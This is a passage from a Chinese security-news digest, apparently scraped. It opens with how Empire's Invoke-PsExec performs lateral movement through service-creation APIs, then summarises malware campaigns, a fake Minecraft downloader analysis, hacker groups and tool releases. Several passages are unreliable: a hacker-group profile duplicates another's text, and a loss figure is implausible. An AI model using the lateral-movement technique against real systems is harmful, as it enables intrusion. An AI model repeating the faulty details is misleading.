+这是Empire系列的起始篇，其中涵盖了对Empire各方面的用法和功能的讲解，这些文章将以作者名分类发布出来。我已经发布了各版本Empire（后续版本见链接），但是还未曾展示出该系列的强大（尽管@enigma0x3在八月发布了一篇《Empire技巧讲解》和《Empire如何用于SCCM》）。本文将会展示Empire如何进行横向扩展，其中会涵盖提权、权限保持、数据挖掘、态势感知以及TrollSploit等等。
+Invoke-PsExec
+PsExec已经陪伴了我们逾十年，效果有目共睹。某些黑客喜欢使用网络管理员的工具，以彼之道还施彼身，PsExec自然也不例外。当然我们并不是必须要使用PsExec进行横向扩展（有些团队已经研究出更好的黑科技），但是它在特定的情况下仍然是一个不错的选择。
+我们自定义实现的PsExec也就是Invoke-PsExec，其很大程度上基于Metasploit来实现。它利用exploit-monday.com上的法子，实现了对底层的win32 API函数的访问，其操作如下：
+1、OpenSCManagerA用来打开受害者机器上服务控制管理器的句柄，此处它使用了SC_MANAGER_ALL_ACCESS (0xF003F)权限。
+2、CreateServiceA用来让服务控制管理器，创建一个指定的新服务，运行一个特定的命令。
+3、接着用OpenServiceA启动该服务，以StartServiceA启用，在服务启动和执行指定的命令时进行短暂停顿。
+4、使用DeleteService删除该服务。
+很明显，这工具动静很大，稍微强点的防火墙就能检测到。但是它的优点在于，能直接给我们提供目标的system权限。上述的功能放在lateral_movement/invoke_psexec模块里，你需要设置Listener、ComputerName，并且配置好其它的内容。
+
+
+
+
+-----------------------------------------------------------11-----------------------------------------------------------
+0X11: 
+     [1.26]AWS推新��管理工具，管理SSL和TLS��更方便 
+
+=700) window.open('http://image.3001.net/images/20160124/14536087653870.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+研究人员发现了一场新型的网络间谍活动，它依赖于大量远程访问木马（Remote Access Trojan，RAT），包括新型强大的Trochilus（蜂鸟）木马，该木马背后的攻击者主要使用了恶意邮件作为攻击向量，邮件中包含了一个.RAR附件的恶意软件，并且它能够躲避沙箱分析。
+利用多种木马的间谍活动Seven Pointed Dagger
+近期，Arbor网络（Arbor Networks）的专家们发现了一场新的网络间谍活动，该活动名为七尖匕首（Seven Pointed Dagger），由一个名为“Group 27”的组织操纵。活动中使用了多种恶意软件，包括PlugX和9002远程访问木马（3102变种）。此外，他们还发现了一种名为Trochilus的新型远程访问木马，它能够躲避沙箱分析。报告中描述道：
+“具体来说，我们发现在六个RAR文件中包括两个PlugX程序实例、一个EvilGrab、一个未知恶意软件、两个名为Trochilus远程访问木马的APT恶意软件实例，加上一个9002远程访问木马的3012变种实例。这七个恶意软件实例能够提供多种功能，包括间谍活动，以及为了访问更多策略而进行的目标内部辅助侦查的手段。”在多次有针对性的网络间谍攻击活动中，都出现了该木马的踪迹。2015年中间，Arbor Networks的专家们首先发现了Group 27组织活动的痕迹，但Trochilus仅仅在2015年10月份在网络上活跃，当时网络罪犯使用它感染一个缅甸网站的访问者。这些网络罪犯们入侵了缅甸联邦选举委员会（UEC）的网站，从而专家们相信网络威胁者仍旧在监视这个国家的政治发展。
+=700) window.open('http://image.3001.net/images/20160124/1453608416233.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Trochilus木马功能
+专家们获得了这些恶意软件的源头，包括一个README文件，里面详细列举了远程访问木马的基本功能。其功能包括：shellcode扩展、远程卸载、文件管理、下载并执行、上传并执行，以及访问系统信息。Arbor Networks的官方人员说，这些恶意软件还具有“为了达到更具战略性的访问，能够进行目标内部漫游”的功能。这款恶意软件看起来很狡猾，它能够在受感染的系统内部漫游，而又不被病毒扫描雷达发现。另外，这款恶意软件又非常复杂，因为它只在内存中运行，而不使用磁盘操作，因此很难被检测到。报告中陈述道：
+“这款恶意软件仅仅在内存中执行，正常操作时最终的有效载荷从未出现在磁盘上。然而，可以通过解码二进制数据来使得分析变得容易。”Trochilus远程访问木马背后的攻击者主要使用了恶意邮件作为攻击向量，邮件中包含了一个.RAR附件的恶意软件。
+此外，其他安全公司和独立组织也分析了这个网络间谍活动，其中包括Palo Alto网络和Citizen实验室，其中Citizen实验室发布了一篇有趣的报告，题目为《针对NGO的恶意软件攻击导致对缅甸政府网站的攻击》。
+远程访问木马的发展前景预测
+毫不怀疑，对于现代间谍活动来说，恶意软件绝对是一个特权工具。所以，我们将无意中协助推进远程访问木马数量的持续增长，并且可以预期到这些威胁将变得更加复杂和难以检测。
+*参考来源：SecurityAffairs
+ 
+ 
+
+
+
+
+
+
+-----------------------------------------------------------12-----------------------------------------------------------
+0X12: 
+     [1.26]AWS推新��管理工具，管理SSL和TLS��更方便 
+
+亚马逊（Amazon）发布AWS凭证管理员（AWS Certificate Manager，ACM）服务，免费提供开发者供应（Provision）、部署和管理更新SSL和TLS凭证，但是仅限于AWS服务使用，目前仅在美国北维吉尼亚地区可以取得ACM服务。
+=700) window.open('http://static4.ithome.com.tw/sites/default/files/styles/picture_size_large/public/field/image/20160125_amazon_acm.jpg?itok=G9OGyQxT')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+日前，亚马逊（Amazon）发布AWS凭证管理员（AWS Certificate Manager，ACM）服务，免费提供开发者用来取得传输层安全协定（Transport Layer Security，TLS）和安全通讯协定（Secure Socket Layer，SSL）的凭证。
+ACM服务提供开发者供应（Provision）、部署和管理更新SSL和TLS凭证，但仅限于以AWS为基础的网站和应用程式使用。使用者可以使用AWS凭证管理员提出凭证请求和管理凭证，接着使用其他AWS服务提供网站或应用程式ACM凭证。
+使用者可以使用ACM主控台（ACM Console）、AWS命令行介面（Command Line Interface，CLI），或是SDK来请求ACM凭证，另外，ACM服务也与负载平衡服务（Elastic Load Balancing）和网路内容加速服务CloudFront整合，使用者也可以使用这些服务来取得ACM凭证。
+不过，亚马逊也在官网表示，ACM凭证目前只可以在上述的AWS服务中取得，在AWS以外的范围无法使用。
+以下图为例，（1）开发者在一个或多个EC2执行个体（Instance）安装一个网站或应用程式，（2）使用负载平衡服务的负载平衡器（Load Balancer）安排用户端路由路径（Route ）到一个或多个AWS服务可用区域的EC2执行个体的流量，（3）开发者使用ACM主控台、API或AWS命令行介面请求ACM凭证，（4）开发者使用负载平衡服务主控台、API或AWS命令行介面，在负载平衡器上提供ACM凭证，（5）用户端从负载平衡器存取网站，（6）负载平衡器分配用户端流量到EC2执行个体。另外，亚马逊在官网特别提醒，ACM凭证不是安装在任何可用的EC2执行个体上。
+=700) window.open('http://static4.ithome.com.tw/sites/default/files/images/20160125_Amazon%20ACM%20EX.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+亚马逊首席传教士Jeff Barr在官方部落格表示，ACM服务目前仅在美国北维吉尼亚地区可以取得，未来将支援其他地区使用此服务。此外，亚马逊也计画增加ACM的认证类型，以及支援其他的AWS服务。
+而除了亚马逊的免费ACM凭证外，在去年12月，免费凭证机构Let's Encrypt宣布进入公开测试，不像ACM凭证仅限AWS服务使用，Let's Encrypt开放人人都可以测试。
+
+
+ 
+ 
+ 
+
+
+
+
+-----------------------------------------------------------13-----------------------------------------------------------
+0X13: 
+     [1.26]Safari用户小心恶作剧网站，点入会当机、系统重开 
+
+除了iOS装置的Safari会当机，以及约20秒后系统重开之外，Mac版的Safari，还有Windows、Mac、iOS 与Android版本上的Chrome 也会受到影响，但系统不会重开机。
+=700) window.open('http://static4.ithome.com.tw/sites/default/files/styles/picture_size_large/public/field/image/sam_5068.jpg?itok=0Yn9eeGf')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Safari浏览器用户们请注意，如果你看到crashsafari.com （请勿连结）的连结千万不要点选，因为点下连进去后，可能造成当机，iPhone或iPad会发烫甚至重新开机。这个恶作剧网站连结已在网路上流传，并已有许多使用者受害。
+↓目前已有众多Safari用户在Twitter纷纷通报这个消息。恶作剧者甚至以短连结散布crashsafari.com诱使他人上当。
+=700) window.open('http://static4.ithome.com.tw/sites/default/files/images/twipost.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+除了iOS装置的Safari会当机，以及约20秒后系统重开之外，Mac版的Safari，还有Windows、Mac、iOS与Android版 本上的Chrome也会受到影响，但系统不会重开机。这个恶作剧网站也已在Chrome开发者论坛上引发热烈讨论。
+根据Wired报导，这个网站是由22岁住在旧金山的Matthew Bryant所设。The Guardian则指出，该网站包含一段字串，执行后会在浏览器网址列加入上千个字元，造成浏览器记忆体超载而当机。Bryant发现了这项臭虫并设立这个恶作剧网站，透过Twitter将网站连结散布蔓延开来。
+F-Secure技术长Mikko Hypponen认为另一个网站crashchrome.com也有相同目的。 
+苹果目前尚未回应回应这是否为一只臭虫，或是何时以及何时修复。
+这并非第一个藉由用户之间简讯而流传的浏览器灾难。Safari在2013年也出现类似的情形。去年安全研究人员也发现Chrome一只臭虫，只要用户收到并点入、甚至滑鼠滑过包含「%%30%30」字串的URL，即可造成Chrome当机。
+
+
+ 
+
+
+ 
+
+
+
+
+-----------------------------------------------------------14-----------------------------------------------------------
+0X14: 
+     [1.26] 国外的信息安全社区是否比国内的好？ 
+
+这明明就是两个问题好么。。。
+1、国外的信息安全社区是否比国内的好？
+Maybe，or not。。。鉴于本人只熟悉中文，略懂英文，除此之外的其他信息安全社区都不曾涉足。。。不知好坏
+好不好，个人以为主观大于客观，喜欢就行，习惯就好。
+2、有没有可以推荐的国外的信息安全论坛或者网站？
+本人论坛去的不多，简单推荐一下。
+国外热门的reddit.com还是有蛮多安全相关的信息的，而且有些爆料相当及时。至于4chan，太前卫了，玩得不是很多。
+hackernews()也是不错的论坛，微博上还有个机器人时常更新它的动态（HackerNewsDaily）。其实我也不常看的，满屏的字伤眼吧。
+Quora（英文知乎）也可以看看，今年Blackhat相关的视频也已经放出来了，顺便练练听力和想象力。
+其实Twitter上面的资源就很多了，关注#安全#标签、研究者、安全厂商、组织、实验室...一般大家关注得多、转发得多的的消息就会发出推送或者邮件，感觉棒棒的！
+信息爆炸年代，个人建议还是专注于你最喜欢的一个点吧。。。毕竟像亚里士多德、牛顿、达・芬奇那样的疯子不常有，而且过去浪费时间的方式也没有现在这么丰富~~
+如果需要国外信息安全网站资源，可以留言，我再进行补充吧。。。=700) window.open('http://bar.freebuf.com/static/Public/img/face/33.gif')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+
+
+-----------------------------------------------------------15-----------------------------------------------------------
+0X15: 
+     [1.26]Kickstarter的Android行动程式出炉了! 
+
+Android版本仍然缺乏部份iOS版本所具备的功能，主要是专案作者的功能，像是透过程式与支持者交流、追踪赞助金额的进度，以及张贴更新资讯等。Kickstarter说，现在的Android为1.0版，未来会释出更多允许作者管理专案的功能。
+=700) window.open('http://static4.ithome.com.tw/sites/default/files/styles/picture_size_large/public/field/image/kickstarter.jpg?itok=Y4HZWaQX')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+众筹网站Kickstarter 上周终于释出支援Android平台的行动程式，允许使用者透过Android装置浏览与赞助Kickstarter专案。
+Kickstarter早在2013年就推出支援iOS的行动程式，但一直到今年才发表Android版 本。该行动程式提供使用者追踪已赞助的专案，浏览友人所赞助的专案，以及探索最新的专案。
+不过，Android版本仍然缺乏部份iOS版本所具备的功能，主要是专案作者的管理功能，像是透过程式与支持者交流、追踪赞助金额的进度，以及张贴更新资讯等。Kickstarter说，现在的Android为1.0版，未来会释出更多允许作者管理专案的功能。
+众筹网站凝聚了各种新鲜的创意，并邀请全球用户以实际行动赞助，2009年成立的Kickstarter迄今已完成25.7万个专案的集资计画，筹募了超过19亿美元的资金。
+根据Kickstarter委由第三方进行的专案履行研究，该站上所陈列的专案中有9%是完全失败的，约有65%如期交货，并以募资1000美元以下的专案失败率最高。
+此外，愿意赞助新创专案的使用者颇有韧性，有73%的支持者在所赞助的专案失败后还愿意赞助其他专案，不过只有19%的支持者愿意再度赞助已失败过的同一名创作者。
+ 
+
+
+
+
+-----------------------------------------------------------16-----------------------------------------------------------
+0X16: 
+     [1.25]Skype用户的春天：IP地址终于可以匿了 
+
+=700) window.open('http://image.3001.net/images/20160126/1453776633741.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Skype本周在一篇官方博文中宣布，他们现在可以隐藏用户的IP地址，保护用户不受网络攻击的侵害。在最新版本的Skype软件中，他们默认启用了这一新的安全特性。
+在线解析IP的resolvers
+在此之前，如果你知道目标的Skype账户名，获取他的IP地址是非常容易的。网上有很多网站提供了这样的服务（resolvers），可以供你解析目标的IP地址。
+在2013年，Brian Krebs曾写过一篇博文，其中提到：
+“我们做出这样的决定，是因为在过去的一年里，网上有许多服务利用这个漏洞，帮助一些不怀好意和游手好闲的人跟踪骚扰我们的用户。比如，一个叫skype resolver的网站，它会在你搜索skype用户的账户名后，给你返回一大把结果（可靠性不能保证），帮助你探寻skype用户的IP地址。”=700) window.open('http://image.3001.net/images/20160126/14537747505747.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+-----------------------------------------------------------17-----------------------------------------------------------
+0X17: 
+     [1.25]嘲风网络安全技术沙龙 
+
+=700) window.open('http://image.3001.net/images/20160126/14537811872506.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+网络在我们的生活中发挥着重要的作用，扮演着重要的角色，我们的衣食住行都离不开网络的联系。然而在我们享受网络带给我们各种便利时，危险也随之而来，我们如何从容应对？欢迎大家一起分享身边的网络安全趣事！
+分享内容：云南黑产分析之安卓版&quot成绩单&quot木马溯源
+分享人：OWASP中国.云南负责人子源先生
+时间：2016年1月28日20时
+地点：昆明西山区广福路湖畔之梦66栋大师会文创中心1-2F啡影1890
+=700) window.open('http://image.3001.net/images/20160126/14537812855000.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+报名电话：0871-68238176
+报名QQ：1326050796
+活动组织：OWASP中国.云南分部、昆明嘲风信息、铸剑网络安全实验室
+注：报名免费，场所消费自理
+
+
+
+
+
+
+
+
+-----------------------------------------------------------18-----------------------------------------------------------
+0X18: 
+     [1.25]沙盒游戏《我的世界》惊现仿冒游戏下载器 
+
+《我的世界》是一款自由度极高的沙盒游戏，自2009年上线以来，一直备受网友追捧。但是，近期AVL移动安全团队截获一款仿冒《我的世界》游戏下载器的恶意软件，经过分析发现该恶意软件有如下行为特征：
+
+1 通过篡改知名游戏《我的世界》下载器进行肆意传播2 该恶意软件执行后会执行so文件解密释放恶意文件3 私自获取用户手机root权限4 静默安装应用到系统目录下，严重威胁用户手机系统安全5 推送其他恶意应用6 推送广告，影响用户操作体验7 为躲避杀毒软件的查杀，将恶意子程序不同的模块分层隐藏到资源文件和ELF文件中一、恶意代码行为说明
+经过AVL移动安全团队对代码的详细分析，该恶意应用的运行流程如下图所示：
+=700) window.open('http://image.3001.net/images/20160126/14537772298825.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+说明：
+1 该应用运行时会加载skin.so文件，解密释放运行恶意子包cE.zip，并通过cE.zip继续释放运行子程序fp.dex和fx.dex。
+2 fp.dex运行后会静默下载提权功能模块，获取用户手机root权限，在后台私自下载应用程序，静默安装到系统目录下。
+3 fx.dex运行后会弹出虚假的漏洞修复窗口，诱导用户下载恶意应用，当用户安装运行恶意应用后会隐藏图标，请求激活设备管理器并私自下载应用推送广告。
+二．恶意代码详细分析
+
+1.动态现象
+该恶意程序运行后会弹出虚假的漏洞修复窗口，诱导用户点击下载恶意应用，用户点击安装运行后会请求激活设备管理器。
+=700) window.open('http://image.3001.net/images/20160126/14537772661365.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160126/14537772771273.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160126/14537772771273.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+2 静态分析
+2.1 解密释放恶意子程序
+在主程序的入口处加载skin.so文件，解密释放子程序cE.zip并加载运行。
+=700) window.open('http://image.3001.net/images/20160126/14537773095814.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在子程序cE.zip当中会继续读取资源文件解密释放fx.jar,fp.jar子程序。
+=700) window.open('http://image.3001.net/images/20160126/14537773644300.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160126/14537773917012.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+=700) window.open('http://image.3001.net/images/20160126/1453777462196.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+.2 私自下载提权功能模块
+主程序在运行时还会加载运行fp.dex，私自下载包含提权功能的right_core.apk。
+
+
+
+
+
+
+
+ 
+ 
+
+
+
+
+
+
+-----------------------------------------------------------19-----------------------------------------------------------
+0X19: 
+     [1.25]渗透系统Parrot Security OS新版本发布 
+
+
+
+渗透系统Parrot Security OS新版本发布
+
+
+=700) window.open('http://image.3001.net/images/20160123/14535274874099.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+Parrot Security OS是一款基于Debian渗透测试系统，里面包含了许多流行的渗透测试工具，在新版本发布前，团队对这一版本做了更多的测试，并更新了云端版，使得新版系统更加稳定高效。
+硬件需求
+
+CPU：至少是主频1Ghz双核的CPURAM:建议256Mb � 512MbGPU：暂无要求HDD Standard：建议 4Gb� 8Gb HDD Full：建议8Gb� 16Gb重点更新内容
+更新了旧版的密码破解工具以及网络安全渗透测试工具增添了新版WiFi密码破解工具增添云端安全工具新添VoIP安全工具增强系统稳定性更新浏览器配置文件管理器云端版：点击我
+
+标准版：点击我
+
+相关阅读：点击我
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------------20-----------------------------------------------------------
+0X20: 
+     [1.25]世界十大黑客组织都是哪些？ 
+
+=700) window.open('http://image.3001.net/images/20160125/14536923075683.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这里梳理了十大黑客组织，看看他们是如何“改变世界”的。
+在过去的几年中，网络攻击变得日益频繁、规模也与日俱增。从针对个人电脑的恶作剧逐渐发展为具有一定规模的“活动”，例如对大公司重要数据的盗窃或者使政府网站、非政府组织的服务器长时间关闭。Hacking不再是程序员的业余爱好，正发展为一个成熟的职业。
+随着黑客数量的增加，越来越多志同道合的黑客们选择组成联盟，其中不乏出现一些“闻名于世”的黑客组织，吸引了全世界的关注。他们高调地炫耀自己的“善行”，仍背负攻击者的恶名。这里我们梳理了十个最为邪恶的黑客组织。
+ANONYMOUS（匿名者）
+=700) window.open('http://image.3001.net/images/20160125/14536925529247.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+他们以号召针对ISIS的报复行动而更为大众所知，戴面具的Guy Fawkes则是他们的标志，匿名者是一个在网络上开放的集团，出没于世界许多角落。他们反对种种不公正现象、事件，保持与Guy Fawkes这种自发维稳的个性特质。匿名者反对基督教科学组织派，入侵五角大楼，攻击Visa、PayPal、MasterCard，他们攻下许多属于ISIS的网站。与此同时，荷兰、美国、英国、澳大利亚、西班牙和土耳其等国家已经逮捕了一些声称是“匿名者”组织的成员。
+
+LIZARD SQUAD（蜥蜴小组）
+=700) window.open('http://image.3001.net/images/20160125/14536925107780.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+蜥蜴小组的受害者包括许多具有高知名度的网站，例如马来西亚航空公司网站，用户被重定向到一个显示了“404-飞机没找到”的页面。而另一受害者Facebook则否认自己被蜥蜴小组DDOS攻击。该组织还攻击过索尼和微软，组织成员将ISIS旗帜发布于索尼的服务器上。一些位于美国和英格兰的成员则因攻击了Xbox和PlayStation而被捕。
+THE LEVEL SEVEN CREW（第七层成员）
+作为最为知名的黑客组织之一，The Level Seven Crew参与了1999年的几场攻击，但是他们的活动似乎与2000年戛然而止。据了解，他们的组织灵感来源于但丁所作《神曲：地狱篇》的第七层，即暴力。该组织的受害者包括美国第一国民银行、NASA、美国驻中国使馆网站以及喜来登酒店。 
+CHAOS COMPUTER CLUB（混沌计算机俱乐部）
+于1980年柏林成立CCC是欧洲最大的黑客组织之一，这是一个世界级的优秀黑客组织，自20世纪80年代以来就为公众提供计算机技术教学。CCC的工作主要是发现政府和一些非政府服务器安全漏洞。他们称，他们此前咨询了大量法律顾问以确定何为非法hacking，而哪些hacking又是位于灰色地带的。
+他们从汉堡的一家银行盗取了134000马克并归还了，称其只是为了验证网站存在的安全漏洞。然而，他们依然还是为向克格勃（俄罗斯情报组织）出售美国公司及政府的源代码而被判有罪。
+LULZSEC
+这个组织简称Lulz安全，为2011年从匿名者组织脱离的成员建立。他们的口号是：自2011年起，你不再安全。（这里是意译，原意为“自2011年起，嘲笑你的安全状况吧”）。他们的首次亮相是攻击了Fox.com，继而是倒霉的是索尼公司。2012年，该组织成员被FBI逮捕，原因竟是他们组织的头目Sabu将他们出卖了。
+
+SYRIAN ELECTRONIC ARMY（叙利亚电子军队）
+=700) window.open('http://image.3001.net/images/20160125/14536926996248.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+叙利亚电子军又名SEA，是一个有严格纪律的组织，目标就是消灭叙利亚反对派。他们被认为都是叙利亚总统阿萨德的拥护者，同时他们标榜自己是积极的叙利亚青年，不会对最近发生的叙利亚起义袖手旁观。
+他们的行动通常为在被攻击网站“张贴”叙利亚国旗，而他们使用的的攻击手段例如钓鱼、DDoS攻击、垃圾邮件以及恶意软件。他们针对性地对有影响力人物的Facebook和推特用户实施攻击，比如美国总统奥巴马及法国前总统萨科齐。
+GLOBALHELL
+这个黑客组织是由一名街头帮派成员Patrick Gregory而发起的。该组织攻击了115个网站，同时摧毁了这些网站的数据造成了数以百万美元的损失。这个有街头成员创立的组织，行为仍然像个帮派一样，他们会定期在美国陆军网站留下了“地狱不死”这样的字样。
+NETWORK CRACK PROGRAM HACKER GROUP（网络破解黑客组织）
+NHCP组织于1994年在中国被发现，据传该组织由中国PLA资助。他们的首脑Tan Dailin也被认为是为中国军方服务的。
+TEAMP0ISON
+=700) window.open('http://image.3001.net/images/20160125/14536926255027.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这个组织是一个用假名的16岁青年在2010年开始建立的。他们曾黑进了北约、Facebook、英国《每日邮报》网站、保卫英国联盟等，以及英国前总统布莱尔的账户。尽管有传闻称该组织在2012年的时候破裂，而2015年他们作为一个白帽子安全研究组织复出。
+TARH ANDISHAN
+这个组织是一个用假名的16岁青年在2010年开始建立的。他们曾黑进了北约、Facebook、英国《每日邮报》网站、保卫英国联盟等，以及英国前总统布莱尔的账户。尽管有传闻称该组织在2012年破裂，而2015年他们作为一个白帽子安全研究组织复出。
+结语
+本文中所讨论的这些黑客组织在一定程度上向大家展示了黑客攻击有时是一个严重的问题，而调查显示由网络攻击活动造成的经济损失已经超过575万亿美元。
+我们看到所谓“黑客组织”也大有不同，像“匿名者”在针对ISIS的行动中赢得了公众的支持，而也有些组织只着眼于自己的利益或者是为背后势力服务的，只是不断给人们带来恐惧和不安。而就像你无法阻止风，这样的攻击行动还会持续下去。
+
+*原文地址：hackread
+
+
+
+ 
+ 
+
+
+
+
+
+-----------------------------------------------------------21-----------------------------------------------------------
+0X21: 
+     [1.25]GCHQ自建的语音加密协议存在后门，可解密所有VoIP通信 
+
+=700) window.open('http://image.3001.net/images/20160122/14534451984368.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+英国政府自制一个官方语音加密协议――MIKEY-SAKKE，希望能建立一个产品生态系统。然而里面存在一个严重后门，安全服务可以以此劫持并监听用户所有的通话内容，包括过去和现在的通话。
+
+MIKEY-SAKKE存在后门，可解密所有VoIP通信
+伦敦大学的Steven Murdoch博士发表了一篇报告，挖掘出MIKEY-SAKKE存在后门，它能监听到一些无法预测和无法审计到的信息。
+该协议是GCHQ（英国政府通信总部）下属的一个分支CESG（电子通信安全组）开发，他们表示开发该协议的目的是帮助加密VoIP通信中的所有语音和多媒体数据。
+Murdoch还发现这项协议是特别针对密钥托管系统设定的。通过这个机制，所有用户的加密密钥都会发送到一个远程的服务器上。正如你想象的那般，一个人访问了服务器也就相当于访问了每个人的加密密钥，当然也可以很容易的通过MIKEY-SAKKE解密VoIP通信。
+=700) window.open('http://image.3001.net/images/20160122/14534451882816.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+GCHQ希望在所有的政府通信中使用带后门的协议
+GCHQ宣称，如果一个产品采用了MIKEY-SAKKE和Secure Chorus，那么他们将只通过CPA安全评估计划保证语音加密产品。这也就意味着未来所有的英国政府通信都必须使用这个“安全的”加密通信。
+其实，英国政府并不想让我们知道他们可以间谍到我们通信中的任何信息。
+* 参考来源news.softpedia，theregister
+
+
+
+
+
+
+
+-----------------------------------------------------------22-----------------------------------------------------------
+0X22: 
+     [1.25]黑客组织匿名者(Anonymous)攻击日本机场网站，抗议捕杀海豚活动 
+
+=700) window.open('http://image.3001.net/images/20160125/14536975199399.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+近日黑客组织匿名者对日本成田国际机场官方网站发起DDOS攻击，并迫使其网站服务下线。
+发起网络攻击主要为了抗议捕杀海豚
+目前当地执法机构以及机场官方已经确认这次网络攻击事件，但表示并未影响机场的正常运营。该事件发生于上周五晚至周六早上这段时间，DDoS攻击主要分为两种：要么大数据，大流量来压垮网络设备和服务器，要么有意制造大量无法完成的不完全请求来快速耗尽服务器资源，所以就需要花掉相当多的时间恢复网站服务。
+根据日本时报（Japan Times）报道，攻击网站的主要原因是抗议该国捕杀海豚的行为，还有就是抗议不允许社会活动家以及活动家Ric O’Barry进入日本的这种行为。目前日本政府可能拒绝Barry入境，理由是之前他曾经拍摄过一部纪录片《The Cove》（海豚湾），这部电影曾在奥斯卡获最佳纪录片奖，电影主要的内容是关于在日本捕杀海豚的故事。
+在这次攻击事件发生之后HackRead与该黑客组织成员有过一段独家对话：
+“攻击机场网站的主要原因是因为他们曾拘留@RichardOBarry ，还有就是他们因为他曾拍摄过一部纪录片《The Cove》而拒绝其入境。”
+=700) window.open('http://image.3001.net/images/20160125/1453697723716.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+该黑客组织早前曾攻击网站抗议虐待动物
+在去年十月，同一组黑客曾攻击日本成田机场与中部机场官方网站，抗议捕杀海豚行为。而在去年九月，该组织黑客曾攻击和歌山县太地町的网站，抗议捕杀海豚以及存储海豚这种行为。
+目前在全世界范围内有很多人都反对捕杀海豚，而其中就有些人以攻击网站的形式来抗议捕杀海豚这种行为。黑客组织匿名者过去也有不少保护动物的行动，曾攻击过x级虐待动物网站以及世界最大的动物虐待论坛。
+Ric O’Barry 
+Ric O’Barry 曾是一位出色的海豚驯兽师，并从事海洋馆的海豚表演和训练。现自己拍摄的影片《海豚的故事》(Flipper)引发了全球的海豚热，从而在一定程度程度上导致大量海豚在日本被捕杀时，他追悔莫及，决定用自己的后半生去揭发这令人发指的黑幕，唤醒人们对海豚保护的意识。后联同电影人LouiePsihoyos还有一个由社会活动家、和自由潜泳者，秘密潜入太地町这个位于日本地形险要的海湾，并拍成纪录片《海豚湾》。
+在2015年8月31日，日本警方以未携带护照为由，逮捕了美国动物保护家理查德・奥巴瑞。
+*参考来源：[backcolor=0px 0px]hackread
+
+
+
+
+
+
+
+-----------------------------------------------------------23-----------------------------------------------------------
+0X23: 
+     [1.25]Kali 2.0 Rolling版发布 
+
+ 
+=700) window.open('http://image.3001.net/images/20160122/14534383632422.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+ 
+ 
+ 
+ 
+Kali 2.0 Rolling版发布
+ 
+ 
+1月21日，Kali首次公开发布Rolling版。早前推出2.0（sana）版本时，Kali便切换到了rolling的发布模式，但是rolling版本的升级仅仅向一部分人提供。经过五个月的测试，我们现在对其可靠性非常有信心，而且在里面添加了许多优秀的安全检测工具的最新版本。
+
+与标准版的不同之处
+Kali标准版基于标准的Debian发行版（如Debian 7，8，9），而rolling版的不同之处在于它基于Debian testing，这就保证了它能够持续地获得最新版本的包。
+在过去五个月时间，我们的自动化更新提醒功能已经确保了Kali系统中安全检测工具都是最新并且最稳定的。当常用工具需要更新，用户将会收到提醒。
+升级
+ cat &lt&lt EOF &gt /etc/apt/sources.listdeb http://http.kali.org/kali kali-rolling main non-free contribEOFapt-get updateapt-get dist-upgrade # get a coffee, or 10.reboot
+下载地址：点我
+
+
+
+
+ 
+ 
+
+
+
+
+-----------------------------------------------------------24-----------------------------------------------------------
+0X24: 
+     [1.25]皇家墨尔本医院Windows XP电脑中毒，这病怎么治？ 
+
+
+
+皇家墨尔本医院Windows XP电脑中毒，这病怎么治？
+
+
+=700) window.open('http://image.3001.net/images/20160121/14533458898147.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
